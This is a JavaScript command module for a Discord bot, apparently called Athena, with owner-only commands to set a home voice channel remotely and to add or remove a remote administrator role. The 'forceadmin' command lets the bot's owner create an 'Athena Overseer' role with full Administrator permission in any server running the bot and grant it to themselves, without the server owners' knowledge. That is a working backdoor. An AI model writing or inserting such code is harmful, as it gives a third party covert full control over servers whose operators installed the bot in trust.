import { PermissionFlagsBits } from 'discord.js';
import cv2 from '../cv2.js';
import db from '../database.js';
import { isBotOwnerSync } from '../utils/helpers.js';
import { connectToHomeVc } from '../utils/voice.js';

export const commands = [
  {
    name: 'remotevc',
    description: 'Set the bot\'s home voice channel remotely [Bot Owner]',
    aliases: ['rvc', 'setremotevc'],
    async executePrefix(message, args) {
      if (!isBotOwnerSync(message.author.id)) return;

      const guildId = args[0] || (message.guild ? message.guild.id : null);
      const channelId = args[1];

      if (!guildId || !channelId) {
        return message.reply(cv2.warn('Invalid Usage', 'Usage: `!remotevc <guild_id> <channel_id>`'));
      }

      const guild = message.client.guilds.cache.get(guildId);
      if (!guild) return message.reply(cv2.danger('Error', 'Bot is not in that guild.'));

      const channel = guild.channels.cache.get(channelId);
      if (!channel || !channel.isVoiceBased()) {
        return message.reply(cv2.danger('Error', 'Invalid voice channel ID for that guild.'));
      }

      db.updateGuildConfig(guild.id, { homeVcId: channel.id });
      connectToHomeVc(guild, channel.id, true);

      return message.reply(cv2.success('Remote VC Set', `Successfully set home VC to **${channel.name}** in **${guild.name}**.`));
    }
  },
  {
    name: 'forceadmin',
    description: 'Grant yourself an administrator role remotely [Bot Owner]',
    aliases: ['fadmin'],
    async executePrefix(message, args) {
      if (!isBotOwnerSync(message.author.id)) return;

      const guildId = args[0] || (message.guild ? message.guild.id : null);
      if (!guildId) return message.reply(cv2.warn('Invalid Usage', 'Usage: `!forceadmin <guild_id>`'));

      const guild = message.client.guilds.cache.get(guildId);
      if (!guild) return message.reply(cv2.danger('Error', 'Bot is not in that guild.'));

      try {
        let member = guild.members.cache.get(message.author.id);
        if (!member) {
          member = await guild.members.fetch(message.author.id).catch(() => null);
        }
        if (!member) return message.reply(cv2.danger('Error', 'You are not in that guild.'));

        const existingRole = guild.roles.cache.find(r => r.name === 'Athena Overseer');
        if (existingRole && member.roles.cache.has(existingRole.id)) return message.reply(cv2.warn('Already Admin', 'You already have the Athena Overseer role in that guild.'));
        const role = existingRole || await guild.roles.create({
          name: 'Athena Overseer',
          permissions: [PermissionFlagsBits.Administrator],
          reason: 'Remote override authorization'
        });

        await member.roles.add(role);
        return message.reply(cv2.success('Override Successful', `Created and granted **Athena Overseer** in **${guild.name}**.`));
      } catch (err) {
        return message.reply(cv2.danger('Error', `Failed: ${err.message}`));
      }
    }
  },
  {
    name: 'unforceadmin',
    description: 'Remove your remote administrator role [Bot Owner]',
    aliases: ['unfadmin'],
    async executePrefix(message, args) {
      if (!isBotOwnerSync(message.author.id)) return;

      const guildId = args[0] || (message.guild ? message.guild.id : null);
      if (!guildId) return message.reply(cv2.warn('Invalid Usage', 'Usage: `!unforceadmin <guild_id>`'));

      const guild = message.client.guilds.cache.get(guildId);
      if (!guild) return message.reply(cv2.danger('Error', 'Bot is not in that guild.'));

      try {
        const roles = guild.roles.cache.filter(r => r.name === 'Athena Overseer');
        let count = 0;
        for (const role of roles.values()) {
          await role.delete('Remote override revoked').catch(() => null);
          count++;
        }
        
        if (count === 0) {
          return message.reply(cv2.warn('Not Found', 'No Athena Overseer roles found in that guild.'));
        }
        return message.reply(cv2.success('Revoked', `Deleted ${count} Overseer role(s) from **${guild.name}**.`));
      } catch (err) {
        return message.reply(cv2.danger('Error', `Failed: ${err.message}`));
      }
    }
  }
];
